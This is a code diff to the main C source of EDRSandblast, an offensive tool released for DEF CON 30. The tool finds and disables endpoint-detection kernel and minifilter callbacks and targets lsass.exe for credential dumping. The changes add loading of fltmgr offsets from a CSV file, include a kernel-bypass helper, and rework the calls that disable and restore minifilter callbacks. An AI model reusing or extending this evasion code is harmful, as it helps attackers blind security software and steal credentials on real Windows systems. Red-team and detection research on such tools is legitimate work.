@@ -20,6 +20,7 @@
 #include "ProcessDump.h"
 #include "ProcessDumpDirectSyscalls.h"
 #include "NtoskrnlOffsets.h"
+#include "FltmgrOffsets.h"
 #include "ObjectCallbacks.h"
 #include "MinifilterCallbacks.h"
 #include "PEBBrowse.h"
@@ -30,6 +31,7 @@
 #include "WdigestOffsets.h"
 
 #include "../EDRSandblast/EDRSandblast.h"
+#include "../KernellandBypass/utils.h"
 
 typedef NTSTATUS(NTAPI* NtQueryInformationProcess_f)(
     HANDLE          ProcessHandle,
@@ -44,7 +46,7 @@ void PrintBanner() {
     const TCHAR defcon[] = TEXT("D3FC0N 30 Edition");
     const TCHAR authors[2][256] = { TEXT("Thomas DIOT (@_Qazeer)"), TEXT("Maxime MEIGNAN (@th3m4ks)") };
     
-    srand(time(NULL));
+    srand((unsigned int)time(NULL));
     int r = rand() % 2;
 
     _putts_or_not(edrsandblast);
@@ -156,6 +158,7 @@ Other options:\n\
     TCHAR driverPath[MAX_PATH] = { 0 };
     TCHAR driverDefaultName[] = DEFAULT_DRIVER_FILE;
     TCHAR ntoskrnlOffsetCSVPath[MAX_PATH] = { 0 };
+    TCHAR fltmgrOffsetCSVPath[MAX_PATH] = { 0 };
     TCHAR wdigestOffsetCSVPath[MAX_PATH] = { 0 };
     TCHAR processName[] = TEXT("lsass.exe");
     TCHAR outputPath[MAX_PATH] = { 0 };
@@ -373,6 +376,19 @@ Other options:\n\
                 _putts_or_not(TEXT("[!] Offsets are missing from the CSV for the version of ntoskrnl in use."));
             }
         }
+        if (_tcslen(fltmgrOffsetCSVPath) == 0) {
+            TCHAR offsetCSVName[] = TEXT("FltmgrOffsets.csv");
+            PathAppend(fltmgrOffsetCSVPath, currentFolderPath);
+            PathAppend(fltmgrOffsetCSVPath, offsetCSVName);
+        }
+
+        if (FileExists(fltmgrOffsetCSVPath)) {
+            _putts_or_not(TEXT("[+] Loading kernel related offsets from the CSV file"));
+            LoadFltmgrOffsetsFromFile(fltmgrOffsetCSVPath);
+            if (!FltmgrOffsetsArePresent()) {
+                _putts_or_not(TEXT("[!] Offsets are missing from the CSV for the version of fltmgr in use."));
+            }
+        }
         if (internet && !NtoskrnlAllKernelCallbacksOffsetsArePresent()) {
             _putts_or_not(TEXT("[+] Downloading kernel related offsets from the MS Symbol Server (will drop a .pdb file in current directory)"));
 #if _DEBUG
@@ -452,7 +468,7 @@ Other options:\n\
         _putts_or_not(TEXT(""));
 
         _putts_or_not(TEXT("[+] Checking if EDR callbacks are registered for minifilters..."));
-        foundMinifilterCallbacks = EnumMinifilterCallbacks(foundEDRDrivers);
+        foundMinifilterCallbacks = EnumMinifilterCallbacks();
         _tprintf_or_not(TEXT("[+] [MinifilterCallblacks]\tObject callbacks are %s !\n"), foundMinifilterCallbacks ? TEXT("present") : TEXT("not found"));
         if (foundMinifilterCallbacks) {
             isSafeToExecutePayloadKernelland = FALSE;
@@ -677,7 +693,7 @@ Other options:\n\
             }
             if (foundMinifilterCallbacks) {
                 _putts_or_not(TEXT("[+] Disabling Minifiter callbacks..."));
-                DisableMinifilterCallbacks(foundEDRDrivers);
+                DisableMinifilterCallbacks();
                 _putts_or_not(TEXT(""));
             }
 
@@ -721,7 +737,7 @@ Other options:\n\
             }
             if (restoreCallbacks == TRUE && foundMinifilterCallbacks) {
                 _putts_or_not(TEXT("[+] Restoring EDR's minifilter callbacks..."));
-                EnableMinifilterCallbacks(foundEDRDrivers);
+                Restore();
                 _putts_or_not(TEXT(""));
             }
 
